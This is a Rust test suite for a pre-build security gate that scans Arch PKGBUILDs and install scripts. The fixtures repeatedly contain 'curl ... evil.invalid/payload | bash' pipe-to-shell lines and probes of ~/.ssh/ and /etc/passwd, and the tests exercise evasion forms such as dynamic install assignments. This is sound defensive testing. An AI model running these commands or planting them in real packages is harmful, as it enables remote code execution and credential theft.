//! End-to-end coverage for Paru's fail-closed pre-build gate.

use std::fs;
use std::path::PathBuf;
use std::process::{Command, Output};
use std::time::{SystemTime, UNIX_EPOCH};

struct TestTree {
    root: PathBuf,
    build_dir: PathBuf,
}

impl TestTree {
    fn new(name: &str) -> Self {
        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let root =
            std::env::temp_dir().join(format!("bewaur-gate-{name}-{}-{nonce}", std::process::id()));
        let build_dir = root.join("build");
        fs::create_dir_all(&build_dir).unwrap();
        Self { root, build_dir }
    }

    fn write_build_file(&self, relative: &str, content: &str) {
        let path = self.build_dir.join(relative);
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, content).unwrap();
    }

    fn write_build_bytes(&self, relative: &str, content: &[u8]) {
        let path = self.build_dir.join(relative);
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, content).unwrap();
    }

    fn write_config(&self, content: &str) {
        let config_dir = self.root.join("config/bewaur");
        fs::create_dir_all(&config_dir).unwrap();
        fs::write(config_dir.join("config.toml"), content).unwrap();
    }

    fn command(&self) -> Command {
        let mut command = Command::new(env!("CARGO_BIN_EXE_bewaur"));
        command
            .args(["gate", "--build-dir"])
            .arg(&self.build_dir)
            .env("HOME", self.root.join("home"))
            .env("XDG_CONFIG_HOME", self.root.join("config"))
            .env("XDG_CACHE_HOME", self.root.join("cache"))
            .env_remove("SUDO_USER")
            .env_remove("DOAS_USER");
        command
    }
}

impl Drop for TestTree {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

fn write_package(tree: &TestTree, pkgbase: &str, package_names: &[&str], pkgbuild: &str) {
    tree.write_build_file("PKGBUILD", pkgbuild);
    let mut srcinfo = format!("pkgbase = {pkgbase}\n");
    for package_name in package_names {
        srcinfo.push_str(&format!("\npkgname = {package_name}\n"));
    }
    tree.write_build_file(".SRCINFO", &srcinfo);
}

fn run_with_pkgbase(tree: &TestTree, pkgbase: &str) -> Output {
    tree.command()
        .env("PKGBASE", pkgbase)
        .output()
        .expect("failed to execute bewaur gate")
}

fn assert_stdout_is_empty(output: &Output) {
    assert!(
        output.stdout.is_empty(),
        "gate wrote to stdout: {}",
        String::from_utf8_lossy(&output.stdout)
    );
}

fn stderr(output: &Output) -> String {
    String::from_utf8(output.stderr.clone()).unwrap()
}

#[test]
fn gate_allows_trusted_local_pkgbuild_and_keeps_stdout_clean() {
    let tree = TestTree::new("trusted");
    write_package(
        &tree,
        "gate-benign",
        &["gate-benign"],
        "pkgname=gate-benign\npkgver=1\npkgrel=1\narch=('any')\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-benign");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    assert!(stderr(&output).contains("bewaur: gate-benign (trust:"));
}

#[test]
fn gate_allows_ok_local_pkgbuild() {
    let tree = TestTree::new("ok");
    write_package(
        &tree,
        "gate-ok",
        &["gate-ok"],
        "pkgname=gate-ok\npkgver=1\npkgrel=1\nsource=('https://github.com/example/gate-ok/archive/v1.tar.gz')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n_probe_home=~/.ssh/\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-ok");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    assert!(stderr(&output).contains("Trust: OK"), "{}", stderr(&output));
}

#[test]
fn gate_blocks_malicious_pkgbuild_before_build() {
    let tree = TestTree::new("malicious-pkgbuild");
    write_package(
        &tree,
        "gate-malicious",
        &["gate-malicious"],
        "pkgname=gate-malicious\npkgver=1\npkgrel=1\nprepare() { curl -s https://evil.invalid/payload | bash; }\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-malicious");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("Trust: MALICIOUS"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
    assert!(
        stderr.contains("> prepare() { curl"),
        "gate report omitted the matched source line: {stderr}"
    );
}

#[test]
fn gate_blocks_known_june_incident_dependency_without_history_context() {
    let tree = TestTree::new("known-incident-dependency");
    write_package(
        &tree,
        "gate-known-incident",
        &["gate-known-incident"],
        "pkgname=gate-known-incident\npkgver=1\npkgrel=1\nsha256sums=()\nbuild() { bun add js-digest; }\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-known-incident");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-JUNE-2026-JS-IOC"), "{stderr}");
    assert!(stderr.contains("bun add js-digest"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_blocks_sketchy_pkgbuild_that_the_ad_hoc_scan_command_only_warns_about() {
    let tree = TestTree::new("sketchy-pkgbuild");
    write_package(
        &tree,
        "gate-cryptominer",
        &["gate-cryptominer"],
        include_str!("fixtures/malicious/cryptominer.PKGBUILD"),
    );

    let output = run_with_pkgbase(&tree, "gate-cryptominer");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("Trust: SKETCHY"), "{stderr}");
    assert!(
        stderr.contains("SKETCHY package blocked before build"),
        "{stderr}"
    );
}

#[test]
fn gate_blocks_suspicious_pkgbuild_before_build() {
    let tree = TestTree::new("suspicious-pkgbuild");
    write_package(
        &tree,
        "firefox-fix",
        &["firefox-fix"],
        "pkgname=firefox-fix\npkgver=1\npkgrel=1\n_probe_home=~/.ssh/\n_probe_accounts=/etc/passwd\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "firefox-fix");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("Trust: SUSPICIOUS"), "{stderr}");
    assert!(
        stderr.contains("SUSPICIOUS package blocked before build"),
        "{stderr}"
    );
}

#[test]
fn gate_scans_referenced_install_script_in_same_analysis_pass() {
    let tree = TestTree::new("install-script");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-install\npkgver=1\npkgrel=1\ninstall=gate-install.install\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-install\n\npkgname = gate-install\n\tinstall = gate-install.install\n",
    );
    tree.write_build_file(
        "gate-install.install",
        "post_install() { curl -s https://evil.invalid/payload | bash; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-install");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-INSTALL-PIPE-SHELL"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_blocks_named_remote_dependency_from_install_script() {
    let tree = TestTree::new("install-script-js-package");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-install-js\npkgver=1\npkgrel=1\ninstall=gate-install-js.install\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-install-js\n\npkgname = gate-install-js\n\tinstall = gate-install-js.install\n",
    );
    tree.write_build_file(
        "gate-install-js.install",
        "post_install() { bun add ordinary-remote-package; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-install-js");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-INSTALL-NAMED-JS-PACKAGE"), "{stderr}");
    assert!(
        stderr.contains("bun add ordinary-remote-package"),
        "{stderr}"
    );
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_scans_pkgbuild_install_when_stale_srcinfo_omits_it() {
    let tree = TestTree::new("stale-srcinfo-install");
    write_package(
        &tree,
        "gate-stale-install",
        &["gate-stale-install"],
        "pkgname=gate-stale-install\npkgver=1\npkgrel=1\ninstall=evil.install\npackage() { :; }\n",
    );
    tree.write_build_file(
        "evil.install",
        "post_install() { curl -s https://evil.invalid/payload | bash; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-stale-install");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-INSTALL-PIPE-SHELL"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_scans_install_assignment_with_redirections() {
    let tree = TestTree::new("redirected-install");
    write_package(
        &tree,
        "gate-redirected-install",
        &["gate-redirected-install"],
        "pkgname=gate-redirected-install\npkgver=1\npkgrel=1\ninstall=evil.install 2>/dev/null\npackage() { :; }\n",
    );
    tree.write_build_file(
        "evil.install",
        "post_install() { curl -s https://evil.invalid/payload | bash; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-redirected-install");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("P-INSTALL-PIPE-SHELL"));
}

#[test]
fn gate_fails_closed_on_dynamic_pkgbuild_install_assignment() {
    let tree = TestTree::new("dynamic-install");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-dynamic\n_install_name=gate-dynamic.install\ninstall=\"${_install_name}\"\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-dynamic\n\npkgname = gate-dynamic\n\tinstall = gate-dynamic.install\n",
    );
    tree.write_build_file(
        "gate-dynamic.install",
        "post_install() { echo installed; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-dynamic");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(
        stderr(&output).contains("dynamic install assignment"),
        "{}",
        stderr(&output)
    );
}

#[test]
fn gate_scans_utf8_local_source_helpers() {
    let tree = TestTree::new("local-helper");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-helper\npkgver=1\npkgrel=1\nsource=('helper.sh')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-helper\n\tsource = helper.sh\n\tsha256sums = 0000000000000000000000000000000000000000000000000000000000000000\n\npkgname = gate-helper\n",
    );
    tree.write_build_file(
        "helper.sh",
        "#!/bin/sh\ncurl -s https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-helper");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-CURL-PIPE"), "{stderr}");
    assert!(stderr.contains("Trust: MALICIOUS"), "{stderr}");
}

#[test]
fn gate_scans_literal_source_array_when_srcinfo_is_stale() {
    let tree = TestTree::new("stale-srcinfo-source");
    write_package(
        &tree,
        "gate-stale-source",
        &["gate-stale-source"],
        "pkgname=gate-stale-source\npkgver=1\npkgrel=1\nsource=('payload.sh')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\npackage() { :; }\n",
    );
    tree.write_build_file(
        "payload.sh",
        "#!/bin/sh\ncurl -s https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-stale-source");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-CURL-PIPE"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_scans_literal_sourced_helper_omitted_from_all_source_metadata() {
    let tree = TestTree::new("direct-sourced-helper");
    write_package(
        &tree,
        "gate-direct-source",
        &["gate-direct-source"],
        "pkgname=gate-direct-source\npkgver=1\npkgrel=1\nprepare() { source payload.sh; }\npackage() { :; }\n",
    );
    tree.write_build_file(
        "payload.sh",
        "#!/bin/sh\ncurl -s https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-direct-source");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-CURL-PIPE"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_scans_control_declared_indexed_and_invoked_helpers() {
    let forms = [
        ("conditional-source", "if source payload.sh; then :; fi"),
        ("indexed-source", "source[0]=payload.sh"),
        ("declared-source", "declare -ra source=('payload.sh')"),
        ("srcdir-command", "$srcdir/payload.sh"),
        ("interpreter-option", "bash -o errexit payload.sh"),
    ];
    for (name, form) in forms {
        let tree = TestTree::new(name);
        let pkgbase = format!("gate-{name}");
        write_package(
            &tree,
            &pkgbase,
            &[&pkgbase],
            &format!(
                "pkgname={pkgbase}\npkgver=1\npkgrel=1\nprepare() {{ {form}; }}\npackage() {{ :; }}\n"
            ),
        );
        tree.write_build_file(
            "payload.sh",
            "#!/bin/sh\ncurl -s https://evil.invalid/payload | bash\n",
        );

        let output = run_with_pkgbase(&tree, &pkgbase);

        assert_stdout_is_empty(&output);
        assert!(!output.status.success(), "{form}: {}", stderr(&output));
        assert!(
            stderr(&output).contains("P-CURL-PIPE"),
            "{form}: {}",
            stderr(&output)
        );
    }
}

#[test]
fn gate_scans_invalid_utf8_helper_bytes_lossily() {
    let tree = TestTree::new("invalid-utf8-helper");
    write_package(
        &tree,
        "gate-invalid-utf8",
        &["gate-invalid-utf8"],
        "pkgname=gate-invalid-utf8\npkgver=1\npkgrel=1\nsource=('payload.sh')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\npackage() { :; }\n",
    );
    tree.write_build_bytes(
        "payload.sh",
        b"#!/bin/sh\n# invalid byte: \xff\ncurl -s https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-invalid-utf8");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-CURL-PIPE"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_does_not_treat_install_text_in_data_positions_as_a_file_reference() {
    let tree = TestTree::new("install-data-positions");
    write_package(
        &tree,
        "gate-install-data",
        &["gate-install-data"],
        "pkgname=gate-install-data\npkgver=1\npkgrel=1\ncommands=('install=missing.install')\npackage() { echo 'install=missing.install'; printf '%s' install=missing.install; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-install-data");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    assert!(!stderr(&output).contains("cannot resolve install script"));
}

#[test]
fn gate_fails_closed_on_printf_v_install_mutation() {
    let tree = TestTree::new("printf-v-install");
    write_package(
        &tree,
        "gate-printf-v",
        &["gate-printf-v"],
        "pkgname=gate-printf-v\npkgver=1\npkgrel=1\nprintf -v install %s evil.install\npackage() { :; }\n",
    );
    tree.write_build_file("evil.install", "post_install() { :; }\n");

    let output = run_with_pkgbase(&tree, "gate-printf-v");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(
        stderr(&output).contains("indirect install mutation"),
        "{}",
        stderr(&output)
    );
}

#[test]
fn gate_allows_printf_v_text_after_the_format_argument() {
    let tree = TestTree::new("printf-v-data");
    write_package(
        &tree,
        "gate-printf-data",
        &["gate-printf-data"],
        "pkgname=gate-printf-data\npkgver=1\npkgrel=1\nprintf '%s\\n' -v install\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-printf-data");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
}

#[test]
fn gate_does_not_execute_inert_patch_or_readme_examples_as_shell() {
    let tree = TestTree::new("inert-source-data");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-inert-data\npkgver=1\npkgrel=1\nsource=('README' 'example.patch')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000' '1111111111111111111111111111111111111111111111111111111111111111')\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-inert-data\n\tsource = README\n\tsource = example.patch\n\tsha256sums = 0000000000000000000000000000000000000000000000000000000000000000\n\tsha256sums = 1111111111111111111111111111111111111111111111111111111111111111\n\npkgname = gate-inert-data\n",
    );
    tree.write_build_file(
        "README",
        "documentation example: curl https://evil.invalid/payload | bash\n",
    );
    tree.write_build_file(
        "example.patch",
        "+curl https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-inert-data");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    assert!(!stderr(&output).contains("P-CURL-PIPE"));
}

#[test]
fn gate_does_not_allow_one_whitelisted_split_package_to_exempt_its_siblings() {
    let tree = TestTree::new("split-whitelist");
    write_package(
        &tree,
        "gate-split",
        &["gate-split-cli", "gate-split-docs"],
        "pkgbase=gate-split\npkgname=(gate-split-cli gate-split-docs)\nprepare() { curl -s https://evil.invalid/payload | bash; }\n",
    );
    tree.write_config("[whitelist]\npackages = [\"gate-split-cli\"]\n");

    let output = run_with_pkgbase(&tree, "gate-split");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("Trust: MALICIOUS"), "{stderr}");
    assert!(stderr.contains("bewaur allow gate-split"), "{stderr}");
}

#[test]
fn gate_honors_an_explicit_package_base_whitelist() {
    let tree = TestTree::new("pkgbase-whitelist");
    write_package(
        &tree,
        "gate-split",
        &["gate-split-cli", "gate-split-docs"],
        "pkgbase=gate-split\npkgname=(gate-split-cli gate-split-docs)\n_install_name=missing.install\ninstall=\"${_install_name}\"\nprepare() { curl -s https://evil.invalid/payload | bash; }\n",
    );
    tree.write_config("[whitelist]\npackages = [\"gate-split\"]\n");

    let output = run_with_pkgbase(&tree, "gate-split");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    let stderr = stderr(&output);
    assert!(
        stderr.contains("package base gate-split is whitelisted"),
        "{stderr}"
    );
    assert!(
        !stderr.contains("Trust:"),
        "whitelisted tree was scanned: {stderr}"
    );
}

#[test]
fn gate_fails_closed_without_paru_pkgbase() {
    let tree = TestTree::new("missing-pkgbase");
    write_package(&tree, "demo", &["demo"], "pkgname=demo\n");

    let output = tree
        .command()
        .env_remove("PKGBASE")
        .output()
        .expect("failed to execute bewaur gate");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("PKGBASE is unavailable"));
}

#[test]
fn gate_fails_closed_on_pkgbase_mismatch() {
    let tree = TestTree::new("pkgbase-mismatch");
    write_package(&tree, "actual", &["actual"], "pkgname=actual\n");

    let output = run_with_pkgbase(&tree, "claimed");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("PKGBASE mismatch"));
}

#[test]
fn gate_fails_closed_on_malformed_existing_config() {
    let tree = TestTree::new("bad-config");
    write_package(&tree, "demo", &["demo"], "pkgname=demo\n");
    tree.write_config("this is not valid TOML = [");

    let output = run_with_pkgbase(&tree, "demo");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("Failed to parse config"));
}

#[test]
fn gate_fails_closed_when_referenced_install_script_cannot_be_read() {
    let tree = TestTree::new("missing-install");
    tree.write_build_file("PKGBUILD", "pkgname=demo\ninstall=missing.install\n");
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = demo\n\npkgname = demo\n\tinstall = missing.install\n",
    );

    let output = run_with_pkgbase(&tree, "demo");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("cannot resolve install script"));
}

#[test]
fn gate_help_describes_the_local_build_directory() {
    let output = Command::new(env!("CARGO_BIN_EXE_bewaur"))
        .args(["gate", "--help"])
        .output()
        .expect("failed to run bewaur gate --help");

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("--build-dir <DIR>"), "{stdout}");
    assert!(stdout.contains("PKGBUILD and .SRCINFO"), "{stdout}");
}
